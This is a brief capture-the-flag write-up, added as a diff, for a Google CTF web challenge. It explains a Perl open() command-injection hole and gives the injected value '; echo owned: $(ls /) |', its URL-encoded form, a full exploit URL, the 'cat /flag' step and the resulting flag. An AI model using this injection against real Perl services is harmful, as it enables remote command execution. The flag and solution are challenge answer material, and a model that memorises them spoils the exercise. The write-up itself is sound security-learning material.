@@ -1,0 +1,27 @@
+inspecting the page shows a comment at the bottom pointing us towards the /src.txt
+
+src.txt is written in perl and has a comment about security, showing us this is our way in
+
+uses perl open() command, which can allow us to gain RCE
+
+the GET request sent to the perl script is /?file=FILE&term=TERM
+
+we replace the FILE with ; echo owned: $(ls /) |    and TERM with owned
+
+this means:
+;                           also execute the following
+echo owned: $(ls /)         print owned so that it is found when we clarify the term owned, and execute the ls / command so we can see folders etc in root
+|                           pipe output to rest of perl script (without this you don't get any output on the webpage, no error just no output)
+
+
+encode so can be passed to url: %3B%20echo%20owned%3A%20%24(ls%20%2F)%20%7C
+
+now go to this url: https://aurora-web.h4ck.ctfcompetition.com/?file=%3B%20echo%20owned%3A%20%24(ls%20%2F)%20%7C&term=owned
+
+shows us the root directory, showing a flag file
+
+now replace ls / with cat /flag and encode etc and we get the flag url:
+
+https://h4ck1ng.google/solve/Y37_@N07h3r_P3r1_H@X0R
+
+better write up: https://blog.lohr.dev/hacking-google-ctf-episode-0 but he incorrectly says we wrap in perl syntax, but actually we wrap so that the URL request is submitted correctly, not so that it is in perl syntaxs
